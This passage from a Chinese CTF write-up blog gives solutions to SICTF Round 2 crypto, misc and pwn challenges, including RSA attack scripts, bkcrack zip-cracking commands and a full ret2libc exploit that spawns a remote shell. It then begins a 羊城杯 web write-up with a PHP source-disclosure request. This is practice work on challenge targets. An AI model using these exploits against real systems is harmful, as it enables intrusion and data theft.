class="string">&#x27;i&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">16</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">24</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">28</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Little Red Riding Hood promise</span></span><br><span class="line"><span class="string">d to obey her mother. The gran</span></span><br><span class="line"><span class="string">dmother lived out in the woods</span></span><br><span class="line"><span class="string">, a half hour from the village</span></span><br><span class="line"><span class="string">. When Little Red Riding Hood</span></span><br><span class="line"><span class="string">entered the woods a wolf came</span></span><br><span class="line"><span class="string">up to her. She did not know wh</span></span><br><span class="line"><span class="string">at a wicked animal he was, and</span></span><br><span class="line"><span class="string"> was not afraid of him. &quot;Good</span></span><br><span class="line"><span class="string">day to you, Little Red Riding</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>最后得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">16</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">24</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">28</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&#x27;\n&#x27;.join([&#x27;&#x27;.join([chr(c) for c in x]) for x in msg]))</span></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;SICTF&#123;MTP_AtTack_is_w0nderFu1&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="签到题来咯！"><a href="#签到题来咯！" class="headerlink" title="签到题来咯！"></a>签到题来咯！</h2><p>参考链接：<a href="https://blog.csdn.net/weixin_55631415/article/details/127994843">https://blog.csdn.net/weixin_55631415/article/details/127994843</a></p><ol><li><p>需要爆破e，e的范围是512到1024之间。</p></li><li><p>sage脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#from tqdm import trange</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, e, n</span>):</span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (<span class="number">114</span>*x+<span class="number">2333</span>)^e - c1</span><br><span class="line">    g2 = (<span class="number">514</span>*x+<span class="number">4555</span>)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">n = <span class="number">18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883</span></span><br><span class="line">c1 = <span class="number">3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520</span></span><br><span class="line">c2 = <span class="number">6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#m1=attack(c1,c2,n,2)</span></span><br><span class="line"><span class="comment">#print(long_to_bytes(int(m1)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">9</span>,<span class="number">2</span>**<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i)==<span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flag=attack(c1,c2,i,e)</span><br><span class="line">    flag=long_to_bytes(<span class="built_in">int</span>(flag))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;SICTF&#123;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h2><p>思路是先将hint1和hint2通分然后相减求出q的倍数，之后再和n求最大公约数从而求出q，之后就是正常的rsa解法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067</span></span><br><span class="line">hint1 = <span class="number">564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580</span></span><br><span class="line">hint2 = <span class="number">484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110</span></span><br><span class="line">c = <span class="number">57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line">q=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a,b <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">12</span>,<span class="number">2</span>**<span class="number">13</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    q=gcd(a*hint1-b*hint2,n)</span><br><span class="line">    <span class="keyword">if</span> q!=<span class="number">1</span> <span class="keyword">and</span> q!=n:</span><br><span class="line">        <span class="built_in">print</span>(q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p = n//q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#8358483529150257619757085065272214074629139403939506404958882156637928949429486966229697771519458532207667137987443291952917150640467328461391364839768437</span></span><br><span class="line"><span class="comment">#b&#x27;SICTF&#123;452aebb6-9c16-441a-ac42-fc608bf6063f&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h2><p>参考： <a href="https://blog.csdn.net/shuaicenglou3032/article/details/119930783">CTF中的RSA套路之低加密指数攻击和低解密指数攻击_KogRow的博客-CSDN博客</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">items</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> items))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">        m = N // n</span><br><span class="line">        d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not pairwise co-prime&quot;</span>)</span><br><span class="line">        result += a * s * m</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"><span class="comment"># e, n, c</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">n1 = <span class="number">14628911682936716611458501697007036859460044243525290515096052103585430459755335375005202100114469571371360084664887335211277585652711111523095037589648375630146039444071400098427638768750755153219974194380355807078158427824557754939604018020265955042573660474772006646525311705184431094905718137297923127124517126579859336516891364853724635334011666814712424599592662398013241607855160919361308195967978220182785816761656927836373944699635667244275310680450562446433724968942835275279255823144471582249379035668825437133182865600026935116686574740844588839352146024513673500770611055698030333734066230166111140083923</span></span><br><span class="line">n2 = <span class="number">16756694748293603983474688536179571665757862433174984877308316444468003022266277794769268134195205510197588585566270416339902269736376811449830775290335951504698137924773942880807921752691668522662285163130340474205633998154849689387759453003838730282756734975490180702422176361373516245372635401939755527017589503572550811648345570775428936487145892225736625411540461653083957762795820510109891180906709827194217045059033312564525916136573856999724346161896146703174418039344166251503310869772735585554127509732135494936119159784702673291794381095696332128950979288440758815310482211285712819274848744478643590996499</span></span><br><span class="line">n3 = <span class="number">12023158079717019193506148537498877243668782424904061914991928068483879707115315968983829360560644394409575645736275352836086080024994045582242629571839276759393418303915955798990522990081795218822313146157773272844272865701134880180795342597049645358985187689813369428579614193015028249821853347208001645148169449968882591709833452960545988520048722323580338213590245476892223967673180144525106292453573842357322398199104132677638909964034937501684668442732786408572501007756270725934445316827054687741612177409932320532825182104820899546084015733164816993674100635828218335112393003462442685677115798304835391938681</span></span><br><span class="line">c1 = <span class="number">786426913645332991929803636719878643130489430090701482974255190570111407517277263761161970232982615374753982050075781017755721714929721429185828101898786972242994012456972241276851428750970754773002966788642795040933520662931514953660571657013642671173456750800960592586345219252277575624120271330470724245201080094330964145796872211627254805407394764183615099525852600855622089361965086460279057625205099471122036599934609091062009161119885692567925924978687256063116915630947838112126347748759078024890458539541208153526564434483654508834147071166870006117573542198238493913144419569943131642262575848786399020602</span></span><br><span class="line">c2 = <span class="number">14269311999815379511888097227418748728398011595172649708273598243317106830139061994801598925448165045032084910971094414749744701731066555194159863759072739031915833091715422787808666326235589236328864675164322734119047182014621724868200908222400504845559290620275973427127376594365043386362821355037781568524903149101953873768462097165128186788759111090267131443645126715520994688945363059795513931799317608292977574376954729552861360597103229877031117089231816770880909815561950691603994439997197261395452797893557057320175747162837857668062550646101714062365530246698404923128445182100334335447738834779014705114350</span></span><br><span class="line">c3 = <span class="number">3204718091370324153305164801961074660508922478706979436653573192321723216725523523538914956544950802616295043619768261075799875855502834749045520466140056621489305006966280527055668378303630674311102581232313032585389907028715671091914904062961720585667564982641321454541632782484415075257140508738041786400512095949826279576159569786734978545737717138115729502475357594151593143140355121154223614868465202149338507796306863351134218879326031985027900678671697876083351974546516576983143592764763925335805465720148057651958521255276602933604064541840892578409973858867533575728482926007556060584654853884046046420855</span></span><br><span class="line"></span><br><span class="line">n = [n1, n2, n3]</span><br><span class="line">c = [c1, c2, c3]</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">zip</span>(c, n))</span><br><span class="line">x, n = CRT(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>, <span class="number">18</span>):</span><br><span class="line">    e = i</span><br><span class="line">    m = gmpy2.iroot(gmpy2.mpz(x), e)[<span class="number">0</span>].digits()</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;fdc0afb5-1c81-46b9-a28a-241f5f64419d&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到-Welcome"><a href="#签到-Welcome" class="headerlink" title="[签到]Welcome"></a>[签到]Welcome</h2><p>关注微信公众号并发送”SICTF2023”就可以获得flag辣！</p><h2 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h2><ol><li><p>先是zip伪加密，用winrar修复即可解压出一张图片。</p></li><li><p>用zsteg查看一下图片，可以看到里面隐写了一张图片。</p><p><img src="/./SICTF_Round2/m_1_1.png"></p></li><li><p>提取出来。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zsteg Pixel_art.png -e &quot;b1,rgb,lsb,xy&quot; -&gt;out.png</span><br></pre></td></tr></table></figure></li><li><p>通过  <a href="https://cn.office-converter.com/png-to-rgb">在线网站</a>，把文件的rgb信息提取出来，可以得到一些.?!。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure></li><li><p>ook编码， <a href="https://www.splitbrain.org/services/ook">在线网站</a> 解码，即可得到flag。</p><p><img src="/./SICTF_Round2/m_1_2.png"></p></li></ol><h2 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h2><ol><li><p>用Audacity打开附件，发现类似morse的东西。</p><p><img src="/./SICTF_Round2/m_3_1.png"></p></li><li><p>手抄下来，即可得到一串莫斯。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..-. ..--- .- ----- ----. -... ..-. -....- --... ..-. ....- .- -....- ....- ..--- -.... ----. -....- ----. ...-- .- ..... -....- -.-. ---.. .- ....- ---.. ...-- -.... ----- -... ----- ...-- -.-.</span><br></pre></td></tr></table></figure></li><li><p>morse在线解码后即可得到flag。</p><p><img src="/./SICTF_Round2/m_3_2.png"></p></li></ol><h2 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h2><p>参考链接：<a href="https://www.cnblogs.com/zysgmzb/p/16834602.html">https://www.cnblogs.com/zysgmzb/p/16834602.html</a></p><ol><li><p>先把png的头写到一个文件内。</p><p><img src="/./SICTF_Round2/m_4_1.png"></p></li><li><p>bkcrack攻击。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack.exe -C flag.zip -c flag.png -p plan.out -o 0</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round2/m_4_2.png"></p></li><li><p>提取出flag.png。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack.exe -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round2/m_4_3.png"></p></li><li><p>最后在png的尾部看到flag。</p><p><img src="/./SICTF_Round2/m_4_4.png"></p></li></ol><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="签到-Shop"><a href="#签到-Shop" class="headerlink" title="[签到]Shop"></a>[签到]Shop</h2><p>根据题目描述，nc连上输入几个-1即可拿到flag</p><h2 id="Different-gadget"><a href="#Different-gadget" class="headerlink" title="Different_gadget"></a>Different_gadget</h2><p>利用read的rdx和rsi残留，ret2write，调用write泄露大量地址，从而获取libc基地址，然后第二次read去getshell即可。完整exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ckyan.pwn.my_script <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;attachment&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> binary != <span class="string">&quot;&quot;</span>:</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    lib = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;210.44.151.51&quot;</span></span><br><span class="line">    port = <span class="string">&quot;10268&quot;</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    lib = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">init(lib, binary, p)</span><br><span class="line">context = init_context(<span class="string">&quot;tmux&quot;</span>, debug)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> lib != <span class="string">&quot;&quot;</span>:</span><br><span class="line">    libc = ELF(lib)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug <span class="keyword">and</span> local:</span><br><span class="line">    ggdb()</span><br><span class="line"></span><br><span class="line">name     = <span class="keyword">lambda</span> obj : [name <span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">if</span> <span class="built_in">globals</span>()[name] <span class="keyword">is</span> obj][<span class="number">0</span>]</span><br><span class="line">set_libc = <span class="keyword">lambda</span> buf : set_libc_base_and_log(name(buf), buf)</span><br><span class="line">lg       = <span class="keyword">lambda</span> buf : log_addr(name(buf), buf)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">rwp_addr = <span class="number">0x404800</span></span><br><span class="line"></span><br><span class="line">pad1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">pad1 += <span class="string">b&#x27;a&#x27;</span> * padding</span><br><span class="line">pad1 += p64(rwp_addr)</span><br><span class="line">pad1 += p64(<span class="number">0x4011CE</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># D()</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Hello!!!&#x27;</span>)</span><br><span class="line">s(pad1)</span><br><span class="line"></span><br><span class="line">r(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = r7f()</span><br><span class="line">lg(leak_addr)</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">128</span></span><br><span class="line">libc = lg(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ret = gadget(&quot;ret&quot;)</span></span><br><span class="line"><span class="comment"># pop_rdi_ret = gadget(&quot;pop rdi;ret&quot;)</span></span><br><span class="line"></span><br><span class="line">ret = libc.address + <span class="number">0x29cd6</span></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = srch(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">pad2 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">pad2 += <span class="string">b&#x27;a&#x27;</span> * padding</span><br><span class="line">pad2 += p64(rwp_addr)</span><br><span class="line">pad2 += p64(ret)</span><br><span class="line">pad2 += p64(pop_rdi_ret)</span><br><span class="line">pad2 += p64(bin_sh_addr)</span><br><span class="line">pad2 += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># D()</span></span><br><span class="line"></span><br><span class="line">s(pad2)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> write up </category>
          
          <category> SICTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯</title>
      <link href="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
      <url>/%E7%BE%8A%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="D0n’t-pl4y-g4m3"><a href="#D0n’t-pl4y-g4m3" class="headerlink" title="D0n’t pl4y g4m3!!!"></a>D0n’t pl4y g4m3!!!</h2><ol><li><p>打开网页，访问<code>/p0p.php</code>，302跳转到一个游戏页面去了。</p></li><li><p>抓包发现php的版本是<code>7.4.21</code>，这个版本的php能读源码，还发现有一个hint.zip。</p></li><li><p>下载hint.zip，解压后在<code>hint.txt</code>文件中得到这样一串东西。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ö_0 0vO Ow0 0w0 Ö_0 Ö_O Ö.O o_o 0.O OvO o.0 owo o.Ö Ö.Ö Ovo 0_Ö Ö_o owO O.0 owo Ö_o owO O.0 owo Ö_0 0wÖ O.0 0w0 Ö_0 OwO ov0 owo o_O O.Ö Övo </span><br></pre></td></tr></table></figure></li><li><p>利用在线网站（<a href="https://zdjd.vercel.app/%EF%BC%89%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0%E6%8F%90%E7%A4%BA%E3%80%82">https://zdjd.vercel.app/），即可得到提示。</a></p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web1_3.png"></p></li><li><p>构造包读取源码。</p><p>数据包：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /p0p.php HTTP/1.1</span><br><span class="line">Host: tcp.cloud.dasctf.com:24054</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web1_1.png"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302 found&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pro</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rce2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$rce2</span>=<span class="variable language_">$this</span>-&gt;exp[<span class="variable">$rce2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable 